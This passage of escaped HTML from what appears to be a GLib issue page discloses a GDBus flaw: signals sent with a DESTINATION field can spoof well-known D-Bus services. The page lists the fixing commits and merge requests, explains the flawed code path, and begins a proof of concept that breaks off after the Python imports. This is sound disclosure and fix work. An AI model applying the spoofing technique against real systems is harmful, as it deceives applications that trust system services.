href=\&quot;/GNOME/glib/-/commit/14c3d6938e32e2f0ca7a1227f66590109af5e767\&quot; data-reference-type=\&quot;commit\&quot; data-original=\&quot;14c3d693\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-commit=\&quot;14c3d6938e32e2f0ca7a1227f66590109af5e767\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;tests: Add support for subscribing to signals from a well-known name\&quot; class=\&quot;gfm gfm-commit has-tooltip\&quot;\u003e14c3d693\u003c/a\u003e \&quot;tests: Add support for subscribing to signals from a well-known name\&quot;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;60:1-60:83\&quot;\u003e\u0026#x000A;\u003ca href=\&quot;/GNOME/glib/-/commit/984354e02d2915506c103d21206ae733e92da5ae\&quot; data-reference-type=\&quot;commit\&quot; data-original=\&quot;984354e0\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-commit=\&quot;984354e02d2915506c103d21206ae733e92da5ae\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;tests: Add a test-case for what happens if a unique name doesn&#39;t exist\&quot; class=\&quot;gfm gfm-commit has-tooltip\&quot;\u003e984354e0\u003c/a\u003e \&quot;tests: Add a test-case for what happens if a unique name doesn&#39;t exist\&quot;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;61:1-61:83\&quot;\u003e\u0026#x000A;\u003ca href=\&quot;/GNOME/glib/-/commit/fd265663f2050e2b65d231c4f42fa6b9480c0eb7\&quot; data-reference-type=\&quot;commit\&quot; data-original=\&quot;fd265663\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-commit=\&quot;fd265663f2050e2b65d231c4f42fa6b9480c0eb7\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;tests: Add test coverage for signals that match the message bus&#39;s name\&quot; class=\&quot;gfm gfm-commit has-tooltip\&quot;\u003efd265663\u003c/a\u003e \&quot;tests: Add test coverage for signals that match the message bus&#39;s name\&quot;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;62:1-62:67\&quot;\u003e\u0026#x000A;\u003ca href=\&quot;/GNOME/glib/-/commit/fc0ee9207281bb5369c2e346606d3e321e5036ff\&quot; data-reference-type=\&quot;commit\&quot; data-original=\&quot;fc0ee920\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-commit=\&quot;fc0ee9207281bb5369c2e346606d3e321e5036ff\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;tests: Add a test for matching by two well-known names\&quot; class=\&quot;gfm gfm-commit has-tooltip\&quot;\u003efc0ee920\u003c/a\u003e \&quot;tests: Add a test for matching by two well-known names\&quot;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;63:1-63:70\&quot;\u003e\u0026#x000A;\u003ca href=\&quot;/GNOME/glib/-/commit/f6d1b5471ae92b5c22cb031db8cbc81e3722b9b9\&quot; data-reference-type=\&quot;commit\&quot; data-original=\&quot;f6d1b547\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-commit=\&quot;f6d1b5471ae92b5c22cb031db8cbc81e3722b9b9\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;tests: Add a test for signal filtering by well-known name\&quot; class=\&quot;gfm gfm-commit has-tooltip\&quot;\u003ef6d1b547\u003c/a\u003e \&quot;tests: Add a test for signal filtering by well-known name\&quot;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;64:1-65:0\&quot;\u003e\u0026#x000A;\u003ca href=\&quot;/GNOME/glib/-/commit/96e3190aef3c1320d1e336c35c03c360b7def277\&quot; data-reference-type=\&quot;commit\&quot; data-original=\&quot;96e3190a\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-commit=\&quot;96e3190aef3c1320d1e336c35c03c360b7def277\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;tests: Ensure that unsubscribing with GetNameOwner in-flight doesn&#39;t crash\&quot; class=\&quot;gfm gfm-commit has-tooltip\&quot;\u003e96e3190a\u003c/a\u003e \&quot;tests: Ensure that unsubscribing with GetNameOwner in-flight doesn&#39;t crash\&quot;\u003c/li\u003e\u0026#x000A;\u003c/ul\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;66:1-66:62\&quot; dir=\&quot;auto\&quot;\u003eThese tests are included in \u003ca href=\&quot;/GNOME/glib/-/merge_requests/4038\&quot; data-reference-type=\&quot;merge_request\&quot; data-original=\&quot;!4038\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-merge-request=\&quot;92486\&quot; data-project-path=\&quot;GNOME/glib\&quot; data-iid=\&quot;4038\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;gdbusconnection: Don&#39;t deliver signals if the sender doesn&#39;t match\&quot; class=\&quot;gfm gfm-merge_request\&quot;\u003e!4038 (merged)\u003c/a\u003e, \u003ca href=\&quot;/GNOME/glib/-/merge_requests/4039\&quot; data-reference-type=\&quot;merge_request\&quot; data-original=\&quot;!4039\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-merge-request=\&quot;92487\&quot; data-project-path=\&quot;GNOME/glib\&quot; data-iid=\&quot;4039\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;Backport !4038 “gdbusconnection: Don&#39;t deliver signals if the sender doesn&#39;t match” to glib-2-80\&quot; class=\&quot;gfm gfm-merge_request\&quot;\u003e!4039 (merged)\u003c/a\u003e, \u003ca href=\&quot;/GNOME/glib/-/merge_requests/4040\&quot; data-reference-type=\&quot;merge_request\&quot; data-original=\&quot;!4040\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-merge-request=\&quot;92488\&quot; data-project-path=\&quot;GNOME/glib\&quot; data-iid=\&quot;4040\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;Backport !4038 “gdbusconnection: Don&#39;t deliver signals if the sender doesn&#39;t match” to glib-2-78\&quot; class=\&quot;gfm gfm-merge_request\&quot;\u003e!4040 (merged)\u003c/a\u003e, \u003ca href=\&quot;/GNOME/glib/-/merge_requests/4041\&quot; data-reference-type=\&quot;merge_request\&quot; data-original=\&quot;!4041\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-merge-request=\&quot;92490\&quot; data-project-path=\&quot;GNOME/glib\&quot; data-iid=\&quot;4041\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;Backport !4038 \u0026quot;gdbusconnection: Don&#39;t deliver signals if the sender doesn&#39;t match\u0026quot; to glib-2-74\&quot; class=\&quot;gfm gfm-merge_request\&quot;\u003e!4041 (closed)\u003c/a\u003e, \u003ca href=\&quot;/GNOME/glib/-/merge_requests/4042\&quot; data-reference-type=\&quot;merge_request\&quot; data-original=\&quot;!4042\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-merge-request=\&quot;92491\&quot; data-project-path=\&quot;GNOME/glib\&quot; data-iid=\&quot;4042\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;Backport !4038 \u0026quot;gdbusconnection: Don&#39;t deliver signals if the sender doesn&#39;t match\u0026quot; to glib-2-66\&quot; class=\&quot;gfm gfm-merge_request\&quot;\u003e!4042 (closed)\u003c/a\u003e.\u003c/p\u003e\u0026#x000A;\u003chr data-sourcepos=\&quot;68:1-69:0\&quot;\u003e\u0026#x000A;\u003ch2 data-sourcepos=\&quot;70:1-70:18\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-original-report\&quot; class=\&quot;anchor\&quot; href=\&quot;#original-report\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eOriginal report\u003c/h2\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;72:1-72:77\&quot; dir=\&quot;auto\&quot;\u003eGDBus subscriptions to well-known services are vulnerable to unicast spoofing\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;74:1-74:178\&quot; dir=\&quot;auto\&quot;\u003eWhen \u003ccode data-sourcepos=\&quot;74:7-74:42\&quot;\u003eg_dbus_connection_signal_subscribe()\u003c/code\u003e is called with a well-known bus service name (e.g. \u003ccode data-sourcepos=\&quot;74:97-74:118\&quot;\u003eorg.freedesktop.login1\u003c/code\u003e) as value for the \u003ccode data-sourcepos=\&quot;74:140-74:145\&quot;\u003esender\u003c/code\u003e argument, the following occurs:\u003c/p\u003e\u0026#x000A;\u003col data-sourcepos=\&quot;76:1-82:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;76:1-76:100\&quot;\u003e\u0026#x000A;\u003ccode data-sourcepos=\&quot;76:5-76:18\&quot;\u003eargs_to_rule()\u003c/code\u003e is called, creating a D-Bus match rule string that contains the well-known name.\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;77:1-77:112\&quot;\u003eThe local variable \u003ccode data-sourcepos=\&quot;77:24-77:41\&quot;\u003esender_unique_name\u003c/code\u003e is set to \u003ccode data-sourcepos=\&quot;77:55-77:56\&quot;\u003e\&quot;\&quot;\u003c/code\u003e, as it is a well-known name rather than a unique name.\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;78:1-78:150\&quot;\u003eThe \u003ccode data-sourcepos=\&quot;78:9-78:31\&quot;\u003emap_rule_to_signal_data\u003c/code\u003e hash table is used to look for a previous \u003ccode data-sourcepos=\&quot;78:77-78:86\&quot;\u003eSignalData\u003c/code\u003e structure for that exact rule string. Let&#39;s assume none exist.\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;79:1-79:215\&quot;\u003eA \u003ccode data-sourcepos=\&quot;79:7-79:16\&quot;\u003eSignalData\u003c/code\u003e structure is created with the well-known name as \u003ccode data-sourcepos=\&quot;79:69-79:74\&quot;\u003esender\u003c/code\u003e and empty string as \u003ccode data-sourcepos=\&quot;79:98-79:115\&quot;\u003esender_unique_name\u003c/code\u003e, then a pointer to the \u003ccode data-sourcepos=\&quot;79:142-79:151\&quot;\u003eSignalData\u003c/code\u003e is stored in \u003ccode data-sourcepos=\&quot;79:168-79:190\&quot;\u003emap_rule_to_signal_data\u003c/code\u003e for future occurrences.\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;80:1-80:80\&quot;\u003eAn \u003ccode data-sourcepos=\&quot;80:8-80:15\&quot;\u003eAddMatch\u003c/code\u003e message is sent to \u003ccode data-sourcepos=\&quot;80:38-80:57\&quot;\u003eorg.freedesktop.DBus\u003c/code\u003e with the rule string.\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;81:1-82:0\&quot;\u003eA pointer to \u003ccode data-sourcepos=\&quot;81:18-81:27\&quot;\u003eSignalData\u003c/code\u003e is stored in \u003ccode data-sourcepos=\&quot;81:44-81:86\&quot;\u003emap_sender_unique_name_to_signal_data_array\u003c/code\u003e with key \u003ccode data-sourcepos=\&quot;81:99-81:129\&quot;\u003esignal_data-\u0026gt;sender_unique_name\u003c/code\u003e, \u003cstrong data-sourcepos=\&quot;81:133-81:154\&quot;\u003ehence empty string\u003c/strong\u003e.\u003c/li\u003e\u0026#x000A;\u003c/ol\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;83:1-83:46\&quot; dir=\&quot;auto\&quot;\u003eLater, the process may receive a D-Bus signal.\u003c/p\u003e\u0026#x000A;\u003col data-sourcepos=\&quot;85:1-99:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;85:1-85:62\&quot;\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;85:4-85:62\&quot;\u003e\u003ccode data-sourcepos=\&quot;85:5-85:24\&quot;\u003edistribute_signals()\u003c/code\u003e gets called with the signal message.\u003c/p\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;86:1-86:134\&quot;\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;86:4-86:134\&quot;\u003e\u003ccode data-sourcepos=\&quot;86:5-86:47\&quot;\u003emap_sender_unique_name_to_signal_data_array\u003c/code\u003e is queried with the unique name of the sender of the signal as key. Nothing is found.\u003c/p\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;87:1-87:141\&quot;\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;87:4-87:141\&quot;\u003e\u003ccode data-sourcepos=\&quot;87:5-87:47\&quot;\u003emap_sender_unique_name_to_signal_data_array\u003c/code\u003e is queried with the empty string as key and \u003ccode data-sourcepos=\&quot;87:95-87:114\&quot;\u003eschedule_callbacks()\u003c/code\u003e is called on the entries.\u003c/p\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;88:1-97:0\&quot;\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;88:4-88:118\&quot;\u003e\u003ccode data-sourcepos=\&quot;88:5-88:24\&quot;\u003eschedule_callbacks()\u003c/code\u003e iterates through the array of \u003ccode data-sourcepos=\&quot;88:58-88:68\&quot;\u003eSignalData*\u003c/code\u003e discarding \u003ccode data-sourcepos=\&quot;88:83-88:92\&quot;\u003eSignalData\u003c/code\u003e structures where either:\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;90:4-90:39\&quot;\u003ea) The interface name doesn&#39;t match.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;92:4-92:50\&quot;\u003eb) The member (i.e. signal name) doesn&#39;t match.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;94:4-94:36\&quot;\u003ec) The object path doesn&#39;t match.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;96:4-96:39\&quot;\u003ed) The signal arguments don&#39;t match.\u003c/p\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;98:1-99:0\&quot;\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;98:4-98:66\&quot;\u003eThe signal callback is called without any further verification.\u003c/p\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003c/ol\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;100:1-100:451\&quot; dir=\&quot;auto\&quot;\u003e\u003cstrong data-sourcepos=\&quot;100:1-100:69\&quot;\u003eNotice that \&quot;The sender doesn&#39;t match\&quot; is not along these checks.\u003c/strong\u003e GDBus assumes that either has already been checked by indexing \u003ccode data-sourcepos=\&quot;100:135-100:177\&quot;\u003emap_sender_unique_name_to_signal_data_array\u003c/code\u003e (which is only true for well-known names and \u003ccode data-sourcepos=\&quot;100:226-100:245\&quot;\u003eorg.freedesktop.DBus\u003c/code\u003e) or that the D-Bus broker wouldn&#39;t send such a message due to it being filtered by the match rule. However, there is at least one case described in the D-Bus specification in which this is not sufficient:\u003c/p\u003e\u0026#x000A;\u003cblockquote data-sourcepos=\&quot;102:1-102:444\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;102:3-102:444\&quot;\u003eMessages may have a DESTINATION field (see the section called “Header Fields”), resulting in a unicast message. If the DESTINATION field is present, it specifies a message recipient by name. Method calls and replies normally specify this field. \u003cstrong data-sourcepos=\&quot;102:252-102:444\&quot;\u003eThe message bus must send messages (of any type) with the DESTINATION field set to the specified recipient, regardless of whether the recipient has set up a match rule matching the message.\u003c/strong\u003e\u003c/p\u003e\u0026#x000A;\u003c/blockquote\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;104:1-104:374\&quot; dir=\&quot;auto\&quot;\u003eTherefore, an attacker on the same bus, even if unable to own any well-known names as it&#39;s the case by default in the SYSTEM bus, can construct a unicast DBus signal message with \u003ccode data-sourcepos=\&quot;104:181-104:191\&quot;\u003eDESTINATION\u003c/code\u003e being the targeted application and send a signal with identical interface name, member, object path and matching arguments in order to spoof a D-Bus service with a well-known name.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;106:1-106:397\&quot; dir=\&quot;auto\&quot;\u003eThe signal will trigger the invocation of the callback and it would be up to the application to validate the \u003ccode data-sourcepos=\&quot;106:111-106:116\&quot;\u003esender\u003c/code\u003e argument and not blindly trust the received signal arguments. This is a problem when the application passed a well-known service name as the \u003ccode data-sourcepos=\&quot;106:261-106:266\&quot;\u003esender\u003c/code\u003e argument for \u003ccode data-sourcepos=\&quot;106:283-106:318\&quot;\u003eg_dbus_connection_signal_subscribe()\u003c/code\u003e expecting GDBus -- somewhat reasonably -- to do this filtering on its behalf.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;108:1-108:167\&quot; dir=\&quot;auto\&quot;\u003eg_dbus_connection_signal_subscribe() is also used internally by GDBus, maybe most notably by GDBusProxy.  Fortunately there is this additional check in \u003ccode data-sourcepos=\&quot;108:154-108:165\&quot;\u003egdbusproxy.c\u003c/code\u003e:\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;110:1-130:3\&quot; data-canonical-lang=\&quot;c\&quot; class=\&quot;code highlight js-syntax-highlight language-c\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\u003cspan class=\&quot;k\&quot;\u003estatic\u003c/span\u003e \u003cspan class=\&quot;kt\&quot;\u003evoid\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\u003cspan class=\&quot;nf\&quot;\u003eon_signal_received\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eGDBusConnection\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e*\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003econnection\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                    \u003cspan class=\&quot;k\&quot;\u003econst\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003egchar\u003c/span\u003e     \u003cspan class=\&quot;o\&quot;\u003e*\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003esender_name\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                    \u003cspan class=\&quot;k\&quot;\u003econst\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003egchar\u003c/span\u003e     \u003cspan class=\&quot;o\&quot;\u003e*\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eobject_path\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC5\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                    \u003cspan class=\&quot;k\&quot;\u003econst\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003egchar\u003c/span\u003e     \u003cspan class=\&quot;o\&quot;\u003e*\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003einterface_name\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC6\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                    \u003cspan class=\&quot;k\&quot;\u003econst\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003egchar\u003c/span\u003e     \u003cspan class=\&quot;o\&quot;\u003e*\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003esignal_name\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC7\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                    \u003cspan class=\&quot;n\&quot;\u003eGVariant\u003c/span\u003e        \u003cspan class=\&quot;o\&quot;\u003e*\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eparameters\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC8\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                    \u003cspan class=\&quot;n\&quot;\u003egpointer\u003c/span\u003e         \u003cspan class=\&quot;n\&quot;\u003euser_data\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC9\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\u003cspan class=\&quot;p\&quot;\u003e{\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC10\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e  \u003cspan class=\&quot;n\&quot;\u003eGWeakRef\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e*\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eproxy_weak\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003euser_data\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e;\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC11\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e  \u003cspan class=\&quot;n\&quot;\u003eGDBusProxy\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e*\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eproxy\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e;\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC12\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC13\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e  \u003cspan class=\&quot;n\&quot;\u003eproxy\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eG_DBUS_PROXY\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eg_weak_ref_get\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eproxy_weak\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e));\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC14\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e  \u003cspan class=\&quot;c1\&quot;\u003e// ...\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC15\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e  \u003cspan class=\&quot;k\&quot;\u003eif\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eproxy\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003epriv\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003ename_owner\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e!=\u003c/span\u003e \u003cspan class=\&quot;nb\&quot;\u003eNULL\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eg_strcmp0\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003esender_name\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eproxy\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003epriv\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003ename_owner\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e!=\u003c/span\u003e \u003cspan class=\&quot;mi\&quot;\u003e0\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC16\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e    \u003cspan class=\&quot;p\&quot;\u003e{\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC17\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e      \u003cspan class=\&quot;c1\&quot;\u003e// ...\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC18\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e      \u003cspan class=\&quot;k\&quot;\u003egoto\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eout\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e;\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC19\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e    \u003cspan class=\&quot;p\&quot;\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;132:1-132:361\&quot; dir=\&quot;auto\&quot;\u003eThanks to that additional check, users of GDBusProxy (e.g. those making use of the GLib signals \u003ccode data-sourcepos=\&quot;132:98-132:107\&quot;\u003e&#39;g-signal&#39;\u003c/code\u003e and \u003ccode data-sourcepos=\&quot;132:115-132:136\&quot;\u003e&#39;g-properties-changed&#39;\u003c/code\u003e instead of calling \u003ccode data-sourcepos=\&quot;132:159-132:194\&quot;\u003eg_dbus_connection_signal_subscribe()\u003c/code\u003e for signal subscriptions) are not affected unless \u003ccode data-sourcepos=\&quot;132:248-132:270\&quot;\u003eproxy-\u0026gt;priv-\u0026gt;name_owner\u003c/code\u003e is NULL, which will only happen if the provided well-known name doesn&#39;t exist in the bus.\u003c/p\u003e\u0026#x000A;\u003ch2 data-sourcepos=\&quot;134:1-134:19\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-proof-of-concept\&quot; class=\&quot;anchor\&quot; href=\&quot;#proof-of-concept\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eProof of concept\u003c/h2\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;136:1-136:300\&quot; dir=\&quot;auto\&quot;\u003eFor a harmless proof of concept targetting the system bus, let&#39;s impersonate NetworkManager to convince the RSS reader Liferea that we are offline when we&#39;re actually online, or vice versa. The following is Python code. The packages dbus-fast and psutil must be installed and Liferea must be running.\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;138:1-180:3\&quot; data-canonical-lang=\&quot;python\&quot; class=\&quot;code highlight js-syntax-highlight language-python\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e\u003cspan class=\&quot;kn\&quot;\u003efrom\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003edbus_fast\u003c/span\u003e \u003cspan class=\&quot;kn\&quot;\u003eimport\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eBusType\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eMessage\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e\u003cspan class=\&quot;kn\&quot;\u003efrom\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003edbus_fast.signature\u003c/span\u003e \u003cspan class=\&quot;kn\&quot;\u003eimport\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eVariant\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;python\&quot;\u003e\u003cspan 